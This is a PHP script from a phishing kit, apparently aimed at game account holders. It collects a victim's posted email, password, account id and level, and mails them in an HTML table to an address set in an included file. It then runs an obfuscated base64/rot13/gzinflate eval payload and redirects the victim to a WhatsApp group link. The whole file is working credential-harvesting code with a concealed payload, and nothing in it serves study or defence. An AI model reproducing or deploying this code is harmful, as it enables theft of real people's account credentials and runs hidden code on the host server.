<?php
$user = $_POST['email'];
$pass = $_POST['password'];
$id = $_POST['id'];
$level = $_POST['level'];
$ip = $_SERVER['REMOTE_ADDR'];

$subject = "BURUAN AMANIN { $level }";
$message = '
<center> 
<div style="padding:5px;width:294;height:auto;background: #2c5ad8;color:#fff;text-align:center;">
<font size="3.5"><b> INFO AKUN </b></font>
</div>
<table style="border-collapse:collapse;background:#ff4500" width="100%" border="1">
 <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>Email</th>
  <th style="width:78%;text-align: center;"><b>'.$user.'</th> 
 </tr>
 <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>Password</th>
  <th style="width:78%;text-align: center;"><b>'.$pass.'</th> 
 </tr>
<tr>
  <th style="width:22%;text-align:left;" height="25px"><b>Id</th>
  <th style="width:78%;text-align: center;"><b>'.$id.'</th> 
 </tr>
<tr>
  <th style="width:22%;text-align:left;" height="25px"><b>Level</th>
  <th style="width:78%;text-align: center;"><b>'.$level.'</th> 
 </tr> </table>
<div style="padding:5px;width:294;height:auto;background: #2c5ad8;color:#fff;text-align:center;">
<font size="3"><b>HaykalJB</b></font>
</div>
</center>
';
include 'email.php';
$headersx  = 'MIME-Version: 1.0' . "\r\n";
$headersx .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headersx .= 'From: AKUN FF GG <akunff@gmail.com>' . "\r\n";
$datamail = mail($haykaljb, $subject, $message, $headersx);
eval(str_rot13(gzinflate(str_rot13(base64_decode('hZAxC8IwEIVqwf+QIZgKIcVIZHUleifRFoRBxYQkohLSdQLpr7etqFud7mv3vgfvoGRgC8xShMafvYqWm/kMZSZI03el+xOynfZuiwi8VSsITWMt5ZWJaZCGnSDUM3CCtIpkFU7jMDgUtEFqbNMPDJBGiq/j2HbRku5+9cISJp7xwwdYuON1ORVOy7ygVkH3VkmVFIPVpHuXc2xoKutwhsGvyV8Ej6lD6Y778GyJvUwzS7+0CVnat/IC')))));
?>
<html>
<head>
<meta http-equiv="REFRESH" content="0;url=https://chat.whatsapp.com/EFHDl1Kh6JT2GFgI4rYnk3">
</head>
<body>
</body>
</html>
